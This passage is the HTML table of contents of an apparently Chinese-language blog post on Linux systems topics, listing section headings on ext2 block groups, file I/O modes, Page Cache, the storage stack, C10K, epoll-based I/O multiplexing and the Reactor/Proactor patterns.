class="toc-text">块组设计的核心思想</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%97%E7%BB%84%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3128MB%E9%99%90%E5%88%B6"><span class="toc-text">块组如何解决128MB限制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%88%86%E5%B8%83%E5%BC%8F%E4%BD%8D%E5%9B%BE%E7%AE%A1%E7%90%86"><span class="toc-text">（1）分布式位图管理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%85%83%E6%95%B0%E6%8D%AE%E5%86%97%E4%BD%99%E4%B8%8E%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96"><span class="toc-text">（2）元数据冗余与性能优化</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E6%94%AF%E6%8C%81%E5%A4%A7%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8"><span class="toc-text">（3）支持大文件存储</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%97%E7%BB%84%E8%AE%BE%E8%AE%A1%E7%9A%84%E5%AE%9E%E9%99%85%E6%95%88%E6%9E%9C"><span class="toc-text">块组设计的实际效果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-Ext2-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%9D%97%E7%BB%84%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3"><span class="toc-text">Linux Ext2 文件系统块组结构详解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%97%E7%BB%84%EF%BC%88Block-Group%EF%BC%89%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%84%E6%88%90"><span class="toc-text">块组（Block Group）的基本组成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%97%E7%BB%84%E4%B8%AD%E9%87%8D%E5%A4%8D%E8%B6%85%E7%BA%A7%E5%9D%97%E5%92%8C%E5%9D%97%E7%BB%84%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-text">块组中重复超级块和块组描述符表的原因</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%9F%E5%9B%A0-1%EF%BC%9A%E5%86%97%E4%BD%99%E5%A4%87%E4%BB%BD%EF%BC%8C%E5%A2%9E%E5%BC%BA%E5%AE%B9%E9%94%99%E8%83%BD%E5%8A%9B"><span class="toc-text">原因 1：冗余备份，增强容错能力</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%9F%E5%9B%A0-2%EF%BC%9A%E5%87%8F%E5%B0%91%E7%A3%81%E5%A4%B4%E5%AF%BB%E9%81%93%E6%97%B6%E9%97%B4%EF%BC%8C%E6%8F%90%E5%8D%87%E6%80%A7%E8%83%BD"><span class="toc-text">原因 2：减少磁头寻道时间，提升性能</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ext2-%E5%90%8E%E7%BB%AD%E7%89%88%E6%9C%AC%E7%9A%84%E6%94%B9%E8%BF%9B%EF%BC%9A-%E7%A8%80%E7%96%8F%E8%B6%85%E7%BA%A7%E5%9D%97%E6%8A%80%E6%9C%AF"><span class="toc-text">**Ext2 后续版本的改进：**稀疏超级块技术</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A8%80%E7%96%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%A7%84%E5%88%99"><span class="toc-text">稀疏技术的实现规则</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A8%80%E7%96%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E4%BC%98%E5%8A%BF"><span class="toc-text">稀疏技术的优势</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E5%9C%BA%E6%99%AF"><span class="toc-text">示例场景</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">软链接、硬链接</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%AA-%E4%B8%BE%E4%B8%AA%E5%AE%9E%E9%99%85%E4%BE%8B%E5%AD%90"><span class="toc-text">🧪 举个实际例子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="toc-text">删除测试：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">文件I&#x2F;O（缓冲与非缓冲 I&#x2F;O、直接与非直接 I&#x2F;O、阻塞与非阻塞 I&#x2F;O、 同步与异步 I&#x2F;O）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E6%9C%AC%E8%B4%A8%E7%90%86%E8%A7%A3"><span class="toc-text">🧠 本质理解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%A6-%E7%94%9F%E6%B4%BB%E7%B1%BB%E6%AF%94"><span class="toc-text">📦 生活类比</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E7%BC%93%E5%86%B2-vs-%E9%9D%9E%E7%BC%93%E5%86%B2-I-O"><span class="toc-text">1、缓冲 vs 非缓冲 I&#x2F;O</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%A6-%E7%BC%93%E5%86%B2-I-O%EF%BC%88Buffered-I-O%EF%BC%89"><span class="toc-text">📦 缓冲 I&#x2F;O（Buffered I&#x2F;O）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%8A-%E9%9D%9E%E7%BC%93%E5%86%B2-I-O%EF%BC%88Unbuffered-I-O%EF%BC%89"><span class="toc-text">🧊 非缓冲 I&#x2F;O（Unbuffered I&#x2F;O）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E7%9B%B4%E6%8E%A5-vs-%E9%9D%9E%E7%9B%B4%E6%8E%A5-I-O%EF%BC%88O-DIRECT%EF%BC%89"><span class="toc-text">2、直接 vs 非直接 I&#x2F;O（O_DIRECT）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A8-%E9%9D%9E%E7%9B%B4%E6%8E%A5-I-O%EF%BC%88%E9%BB%98%E8%AE%A4%EF%BC%89"><span class="toc-text">💨 非直接 I&#x2F;O（默认）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%9A%80-%E7%9B%B4%E6%8E%A5-I-O%EF%BC%88Direct-I-O%EF%BC%89"><span class="toc-text">🚀 直接 I&#x2F;O（Direct I&#x2F;O）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E9%98%BB%E5%A1%9E-I-O-vs-%E9%9D%9E%E9%98%BB%E5%A1%9E-I-O"><span class="toc-text">3、阻塞 I&#x2F;O vs 非阻塞 I&#x2F;O</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E9%98%BB%E5%A1%9E-I-O%EF%BC%88%E9%BB%98%E8%AE%A4%E7%9A%84-read-accept-recv-%E7%AD%89%EF%BC%89"><span class="toc-text">✅ 阻塞 I&#x2F;O（默认的 read() &#x2F; accept() &#x2F; recv() 等）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%B5%81%E5%8A%A8%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-text">数据流动过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E9%9D%9E%E9%98%BB%E5%A1%9E-I-O%EF%BC%88%E8%AE%BE%E7%BD%AE-O-NONBLOCK-%E6%88%96%E4%BD%BF%E7%94%A8-Java-NIO%EF%BC%89"><span class="toc-text">✅ 非阻塞 I&#x2F;O（设置 O_NONBLOCK 或使用 Java NIO）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%B5%81%E5%8A%A8%E8%BF%87%E7%A8%8B%EF%BC%9A-2"><span class="toc-text">数据流动过程：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E5%90%8C%E6%AD%A5-I-O-vs-%E5%BC%82%E6%AD%A5-I-O"><span class="toc-text">4、同步 I&#x2F;O vs 异步 I&#x2F;O</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%90%8C%E6%AD%A5-I-O"><span class="toc-text">✅ 同步 I&#x2F;O</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%B5%81%E5%8A%A8%E8%BF%87%E7%A8%8B%EF%BC%9A-3"><span class="toc-text">数据流动过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%BC%82%E6%AD%A5-I-O%EF%BC%88%E5%A6%82-aio-read-%E3%80%81Java-NIO-2-%E7%9A%84-AsynchronousFileChannel%EF%BC%89"><span class="toc-text">✅ 异步 I&#x2F;O（如 aio_read()、Java NIO.2 的 AsynchronousFileChannel）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%B5%81%E5%8A%A8%E8%BF%87%E7%A8%8B%EF%BC%9A-4"><span class="toc-text">数据流动过程：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E4%BD%A0%E9%97%AE%E7%9A%84%E6%98%AF%EF%BC%9A"><span class="toc-text">🧠 你问的是：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%A0%B8%E5%BF%83%E5%8C%BA%E5%88%AB%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">✅ 核心区别一句话总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">PageCache</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-1-%E7%94%A8%E6%88%B7%E6%80%81%E7%A8%8B%E5%BA%8F%E7%9A%84-I-O-%E5%B9%B6%E4%B8%8D%E7%9B%B4%E6%8E%A5%E5%86%99%E7%A3%81%E7%9B%98"><span class="toc-text">✅ 1. 用户态程序的 I&#x2F;O 并不直接写磁盘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-2-%E9%BB%98%E8%AE%A4%E6%98%AF%E3%80%8CBuffered-I-O%E3%80%8D%E2%80%94%E2%80%94-%E5%85%88%E8%BF%9B-Page-Cache%EF%BC%8C%E5%86%8D%E5%86%99%E7%A3%81%E7%9B%98"><span class="toc-text">✅ 2. 默认是「Buffered I&#x2F;O」—— 先进 Page Cache，再写磁盘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-3-%E5%A6%82%E6%9E%9C%E4%BD%A0%E4%BD%BF%E7%94%A8%E4%BA%86%E3%80%8CDirect-I-O%EF%BC%88O-DIRECT%EF%BC%89%E3%80%8D"><span class="toc-text">✅ 3. 如果你使用了「Direct I&#x2F;O（O_DIRECT）」</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-4-%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84-I-O%EF%BC%88mmap%EF%BC%89"><span class="toc-text">✅ 4. 内存映射 I&#x2F;O（mmap）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%83%85%E5%86%B5%E4%B8%80%EF%BC%9A%E6%B2%A1%E6%9C%89%E7%BC%93%E5%86%B2%EF%BC%88%E5%A6%82%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8-FileOutputStream%EF%BC%89"><span class="toc-text">情况一：没有缓冲（如直接使用 FileOutputStream）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%83%85%E5%86%B5%E4%BA%8C%EF%BC%9A%E7%94%A8%E4%BA%86%E7%BC%93%E5%86%B2%EF%BC%88%E6%AF%94%E5%A6%82-BufferedWriter%E3%80%81BufferedOutputStream-%EF%BC%89"><span class="toc-text">情况二：用了缓冲（比如 BufferedWriter、BufferedOutputStream****）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BB%80%E4%B9%88%E6%98%AF-page-%E4%B8%8E-Page-Cache%EF%BC%9F"><span class="toc-text">✅ 什么是 page 与 Page Cache？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%B9%B6%E4%B8%8D%E6%98%AF%E6%89%80%E6%9C%89%E7%9A%84-page-%E9%83%BD%E5%B1%9E%E4%BA%8E-Page-Cache"><span class="toc-text">✅ 并不是所有的 page 都属于 Page Cache</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AB-Page-Cache-%E8%80%8C%E4%B8%8D%E6%98%AF-Block-Cache%EF%BC%9F"><span class="toc-text">✅ 为什么叫 Page Cache 而不是 Block Cache？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%B8%8D%E4%BC%9A%E8%BF%9B%E5%85%A5-Page-Cache%EF%BC%9F"><span class="toc-text">✅ 什么时候不会进入 Page Cache？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%B8%AA%E7%B1%BB%E6%AF%94%E6%96%B9%E4%BE%BF%E7%90%86%E8%A7%A3%EF%BC%9A"><span class="toc-text">✅ 举个类比方便理解：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-File-backed-page-vs-Anonymous-page-%E7%9A%84-swap-%E8%A1%8C%E4%B8%BA%E5%AF%B9%E6%AF%94"><span class="toc-text">✅ File-backed page vs Anonymous page 的 swap 行为对比</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">linux存储堆栈（设备管理）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Linux存储堆栈：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%A9%BA%E9%97%B4"><span class="toc-text">用户空间</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F"><span class="toc-text">用户程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3"><span class="toc-text">文件系统接口</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E7%A9%BA%E9%97%B4"><span class="toc-text">内核空间</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%EF%BC%88VFS%EF%BC%89"><span class="toc-text">虚拟文件系统（VFS）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%EF%BC%88ext4%E3%80%81NFS%EF%BC%89"><span class="toc-text">具体文件系统（ext4、NFS）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B5%E7%BC%93%E5%AD%98%EF%BC%88Page-Cache%EF%BC%89"><span class="toc-text">页缓存（Page Cache）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E5%9D%97%E5%B1%82%EF%BC%88Generic-Block-Layer%EF%BC%89"><span class="toc-text">通用块层（Generic Block Layer）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#I-O%E8%B0%83%E5%BA%A6%E5%B1%82%EF%BC%88I-O-Scheduler%EF%BC%89"><span class="toc-text">I&#x2F;O调度层（I&#x2F;O Scheduler）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9D%97%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F"><span class="toc-text">块设备驱动程序</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%A9%E7%90%86%E7%A1%AC%E4%BB%B6%E5%B1%82"><span class="toc-text">物理硬件层</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9D%97%E8%AE%BE%E5%A4%87%E4%B8%AD%E6%96%AD%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-text">块设备中断控制器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9D%97%E8%AE%BE%E5%A4%87%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-text">块设备控制器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A3%81%E7%9B%98%E8%AE%BE%E5%A4%87"><span class="toc-text">磁盘设备</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%B5%81%E5%8A%A8%E7%A4%BA%E4%BE%8B%EF%BC%9A%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-text">数据流动示例：读取文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">如何服务更多用户（网络系统）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%AE%A8%E8%AE%BA-TCP-%E7%BD%91%E7%BB%9C-I-O-%E6%A8%A1%E5%9E%8B%EF%BC%9F"><span class="toc-text">一、前言：为什么要讨论 TCP 网络 I&#x2F;O 模型？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%88%B0%E5%BA%95%E8%83%BD%E5%90%8C%E6%97%B6%E6%94%AF%E6%8C%81%E5%A4%9A%E5%B0%91%E4%B8%AA-TCP-%E8%BF%9E%E6%8E%A5%EF%BC%9F"><span class="toc-text">二、服务端到底能同时支持多少个 TCP 连接？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%93%E8%AE%BA%EF%BC%9A%E6%9C%80%E5%A4%A7-TCP-%E8%BF%9E%E6%8E%A5%E6%95%B0-%E5%AE%A2%E6%88%B7%E7%AB%AF-IP-%E6%95%B0-%C3%97-%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%AB%AF%E5%8F%A3%E6%95%B0"><span class="toc-text">结论：最大 TCP 连接数 &#x3D; 客户端 IP 数 × 客户端端口数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E9%99%90%E5%88%B6%E5%AE%9E%E9%99%85-TCP-%E8%BF%9E%E6%8E%A5%E6%95%B0%E9%87%8F%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%9B%A0%E7%B4%A0%EF%BC%9A"><span class="toc-text">三、限制实际 TCP 连接数量的两个因素：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88File-Descriptor%EF%BC%89%E9%99%90%E5%88%B6%EF%BC%9A"><span class="toc-text">1. 文件描述符（File Descriptor）限制：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%86%85%E5%AD%98%E9%99%90%E5%88%B6%EF%BC%9A"><span class="toc-text">2. 内存限制：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF-C10K-%E9%97%AE%E9%A2%98%EF%BC%9F"><span class="toc-text">四、什么是 C10K 问题？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%9A"><span class="toc-text">总结一句话：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">IO多路复用：select&#x2F;poll&#x2F;epoll</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%A8%A1%E5%9E%8B"><span class="toc-text">多进程模型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A7-%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%A8%A1%E5%9E%8B%EF%BC%9F"><span class="toc-text">🔧 一、什么是多进程模型？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E7%82%B9%EF%BC%9A-3"><span class="toc-text">特点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%84-%E4%BA%8C%E3%80%81%E6%A0%B8%E5%BF%83%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3%EF%BC%88%E7%BB%93%E5%90%88%E5%9B%BE%E8%A7%A3%E8%AF%B4%E6%98%8E%EF%BC%89"><span class="toc-text">🔄 二、核心流程详解（结合图解说明）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8D%E7%88%B6%E8%BF%9B%E7%A8%8B%EF%BC%88%E4%B8%BB%E8%BF%9B%E7%A8%8B%EF%BC%89%E8%B4%9F%E8%B4%A3%E7%9A%84%E4%BA%8B%E6%83%85%EF%BC%9A"><span class="toc-text">📍父进程（主进程）负责的事情：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8D%E5%AD%90%E8%BF%9B%E7%A8%8B%E8%B4%9F%E8%B4%A3%E7%9A%84%E4%BA%8B%E6%83%85%EF%BC%9A"><span class="toc-text">📍子进程负责的事情：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A1%E6%B3%A8%E6%84%8F%EF%BC%9Afork-%E6%98%AF%E2%80%9C%E5%A4%8D%E5%88%B6%E2%80%9D%E7%88%B6%E8%BF%9B%E7%A8%8B"><span class="toc-text">💡注意：fork() 是“复制”父进程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9A%99%EF%B8%8F-%E4%B8%89%E3%80%81%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E7%9A%84%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%85%B3%E9%97%AD%E8%AF%B4%E6%98%8E"><span class="toc-text">⚙️ 三、文件描述符的继承与关闭说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E5%9B%9B%E3%80%81%E5%AD%90%E8%BF%9B%E7%A8%8B%E7%9A%84%E9%80%80%E5%87%BA%E4%B8%8E%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%E9%97%AE%E9%A2%98"><span class="toc-text">🧠 四、子进程的退出与僵尸进程问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%89-%E4%BA%94%E3%80%81%E4%BC%98%E7%BC%BA%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-text">📉 五、优缺点总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BC%98%E7%82%B9%EF%BC%9A"><span class="toc-text">✅ 优点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E7%BC%BA%E7%82%B9%EF%BC%9A"><span class="toc-text">❌ 缺点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-%E5%85%AD%E3%80%81%E6%80%BB%E7%BB%93%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-text">🧩 六、总结一句话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%9F%E2%99%82%EF%B8%8F-%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%EF%BC%9F"><span class="toc-text">🧟♂️ 一、什么是僵尸进程？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E4%BA%8C%E3%80%81%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E6%9C%89%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%EF%BC%9F"><span class="toc-text">🔍 二、为什么会有僵尸进程？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B"><span class="toc-text">多线程模型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8"><span class="toc-text">IO多路复用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%B9%E7%BC%98%E8%A7%A6%E5%8F%91%E5%92%8C%E6%B0%B4%E5%B9%B3%E8%A7%A6%E5%8F%91"><span class="toc-text">边缘触发和水平触发</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%A1-%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E5%8D%95%E8%BF%9B%E7%A8%8B%EF%BC%8C%E6%80%8E%E4%B9%88%E5%B0%B1%E8%83%BD%E5%88%A9%E7%94%A8%E5%A4%9A%E6%A0%B8%E4%BA%86%EF%BC%9F"><span class="toc-text">💡 多线程 + 单进程，怎么就能利用多核了？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E9%9D%A2%E8%AF%95%E5%9B%9E%E7%AD%94%E8%8C%83%E5%BC%8F%EF%BC%88%E4%BD%A0%E5%8F%AF%E4%BB%A5%E8%BF%99%E6%A0%B7%E8%AF%B4%EF%BC%89%EF%BC%9A"><span class="toc-text">🧠 面试回答范式（你可以这样说）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%A4%9A%E6%A0%B8-CPU-%E4%B8%8B%E7%9A%84%E5%B9%B6%E5%8F%91%E6%89%A7%E8%A1%8C%E8%83%BD%E5%8A%9B"><span class="toc-text">✅ 多核 CPU 下的并发执行能力</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-1-%E5%A4%9A%E8%BF%9B%E7%A8%8B%EF%BC%9A%E5%A4%A9%E7%94%9F%E9%80%82%E5%90%88%E5%A4%9A%E6%A0%B8"><span class="toc-text">✅ 1. 多进程：天生适合多核</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-2-%E5%8D%95%E8%BF%9B%E7%A8%8B-%E5%A4%9A%E7%BA%BF%E7%A8%8B%EF%BC%9A%E5%90%8C%E6%A0%B7%E5%8F%AF%E4%BB%A5%E8%B7%91%E6%BB%A1%E5%A4%9A%E6%A0%B8"><span class="toc-text">✅ 2. 单进程 + 多线程：同样可以跑满多核</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Reactor和Proactor</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%B9%E4%B8%80%E3%80%81Reactor-%E5%92%8C-Proactor-%E6%A8%A1%E5%9E%8B%E6%A0%B8%E5%BF%83%E5%8C%BA%E5%88%AB"><span class="toc-text">🔹一、Reactor 和 Proactor 模型核心区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%B9%E4%BA%8C%E3%80%81%E8%AF%A6%E7%BB%86%E7%90%86%E8%A7%A3%E4%B8%A4%E8%80%85%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-text">🔹二、详细理解两者流程图</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85Reactor-%E6%A8%A1%E5%BC%8F%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-text">✅Reactor 模式工作流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85Proactor-%E6%A8%A1%E5%BC%8F%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-text">✅Proactor 模式工作流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 